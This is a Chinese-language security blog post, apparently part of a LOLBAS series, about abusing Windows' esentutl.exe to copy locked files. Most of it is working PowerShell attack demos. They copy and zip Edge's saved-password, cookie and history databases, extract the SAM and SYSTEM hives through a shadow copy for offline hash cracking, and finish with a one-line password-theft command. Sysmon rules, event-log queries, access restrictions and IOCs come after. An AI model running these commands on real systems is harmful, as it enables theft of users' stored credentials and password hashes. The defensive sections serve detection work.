---
title: " LOLBAS鐵人賽Day18Esentutl.exe：濫用資料庫工具進行檔案竊取"
published: 2025-10-02T14:45:55.000Z
description: "LOLBAS 系列第 18 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

## 前言

Esentutl.exe是Windows內建的ESE資料庫工具，  
他的**檔案複製功能可繞過檔案鎖定**，  
所以也常常成為攻擊者竊取資料的好工具

## 工具特性

*   **路徑**: `C:\Windows\System32\esentutl.exe`
*   **核心參數**: `/y` (複製檔案)`/vss` (使用陰影複製)
*   **關鍵優勢**: 可複製被鎖定的檔案白名單程式低調執行

## 攻擊Demo

### 快速測試

先測試esentutl是否正常運作：

```powershell
echo test > t.txt
esentutl /y t.txt /d c.txt /o
cat c.txt
rm t.txt,c.txt -F

```

看到"Operation completed successfully"表示正常

### Demo 1：竊取瀏覽器密碼資料庫

繞過瀏覽器鎖定，複製儲存的密碼和Cookie

```powershell
$b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$o = "$env:TEMP\bd"
mkdir $o -F | Out-Null

ls "$b\*Data","$b\Cookies","$b\History" -EA 0 | % {
    esentutl /y $_.FullName /d "$o\$($_.Name).db" /o 2>$null
}

Compress-Archive $o "$env:TEMP\b.zip" -F
echo "Done: $env:TEMP\b.zip"
rm $o -R -F

```

**執行結果分析**：

當執行時，esentutl會顯示複製進度：

```
Initiating COPY FILE mode...
Source File: ...\Login Data
Copy Progress: |----|----|----|----|
Operation completed successfully

```

**技術重點**：

1.  **Login Data** (約50KB)：儲存的網站密碼（加密）
2.  **Web Data** (約230KB)：自動填充信用卡資訊
3.  **Cookies**：認證令牌
4.  **History**：瀏覽記錄

**攻擊價值**：

*   這些資料庫可離線解密（如ChromePassSharpChrome）
*   包含所有儲存的認證資訊
*   可用於憑證填充攻擊

### Demo 2：利用VSS竊取系統認證

配合陰影複製存取SAM資料庫

```powershell
vssadmin create shadow /for=C: 2>$null
$s = (vssadmin list shadows | Select-String "HarddiskVolumeShadowCopy" | Select -Last 1) -replace '.*Copy(\d+).*','$1'

if($s){
    $p = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$s"
    esentutl /y "$p\Windows\System32\config\SAM" /d "$env:TEMP\SAM" /o 2>$null
    esentutl /y "$p\Windows\System32\config\SYSTEM" /d "$env:TEMP\SYSTEM" /o 2>$null
    
    if(Test-Path "$env:TEMP\SAM"){echo "[+] SAM extracted"}
    if(Test-Path "$env:TEMP\SYSTEM"){echo "[+] SYSTEM extracted"}
    
    rm "$env:TEMP\SAM","$env:TEMP\SYSTEM" -F -EA 0
}

```

**攻擊價值**：

1.  **SAM檔案**：包含使用者密碼雜湊
2.  **SYSTEM檔案**：解密SAM所需金鑰
3.  **離線破解**：可用hashcat或john破解密碼

## 偵測方法

### 監控命令列

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} |
? {$_.Message -match 'esentutl.*/y'}

```

### Sysmon規則

```xml
<RuleGroup name="Esentutl_Abuse">
    <ProcessCreate onmatch="include">
        <Image condition="end with">esentutl.exe</Image>
        <CommandLine condition="contains any">Login Data;Cookies;SAM;SYSTEM;/y</CommandLine>
    </ProcessCreate>
</RuleGroup>

```

## 防禦措施

### 限制執行權限

```powershell
icacls C:\Windows\System32\esentutl.exe /grant Administrators:(RX) /inheritance:r

```

### 監控關鍵目錄

```powershell
auditpol /set /subcategory:"File System" /success:enable /failure:enable
wevtutil qe Security /q:"*[EventData[Data[@Name='ObjectName'] and (Data='*Login Data*' or Data='*SAM*')]]" /f:text

```

## 關鍵指標 (IOCs)

### 命令列特徵

*   `esentutl /y * /d *` - 檔案複製模式
*   路徑包含：Login DataCookiesSAMSYSTEM

### 異常行為

*   esentutl存取瀏覽器目錄
*   esentutl配合vssadmin執行
*   短時間內多次執行esentutl

### 檔案痕跡

*   TEMP目錄出現.db檔案
*   瀏覽器資料庫副本
*   SAM/SYSTEM檔案副本

## 總結

Esentutl危險是因為：

1.  **繞過檔案鎖定** - 複製使用中的檔案
2.  **白名單信任** - Microsoft簽章
3.  **低偵測率** - 很少被監控

一行竊取瀏覽器密碼：

```powershell
esentutl /y "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" /d pwd.db /o

```